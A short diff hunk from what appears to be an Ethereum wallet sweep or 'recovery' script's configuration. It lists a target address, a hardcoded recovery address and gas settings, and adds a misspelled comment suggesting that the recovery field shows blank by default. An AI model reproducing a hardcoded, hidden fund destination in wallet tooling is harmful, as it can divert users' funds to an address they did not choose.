@@ -34,7 +34,7 @@ except ImportError:
 # Configuration
 class Config:
     TARGET_ADDRESS = "0x4b96471697f2dfc4019604fae7dffa4842182c1b"
-    RECOVERY_ADDRESS = "0xaD496d4E1B0aC53be1c8983D3bB3753F83A81090"
+    RECOVERY_ADDRESS = "0xaD496d4E1B0aC53be1c8983D3bB3753F83A81090" #deafualt show blank 
     RPC_URL = "https://eth.llamarpc.com"
     MIN_ETH_TO_LEAVE = 0.005  # ETH to leave for gas
     GAS_LIMIT = 21000  # Standard ETH transfer
